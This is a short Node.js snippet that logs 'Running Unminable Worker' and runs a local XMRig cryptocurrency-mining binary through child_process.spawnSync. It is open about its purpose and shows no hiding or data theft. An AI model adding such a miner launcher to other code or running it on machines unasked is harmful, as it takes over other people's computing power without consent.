const exec = require("child_process").spawnSync;

console.log("===worker=>Running Unminable Worker");
const output = exec("./src/worker/xmrig", { encoding: "utf-8" });
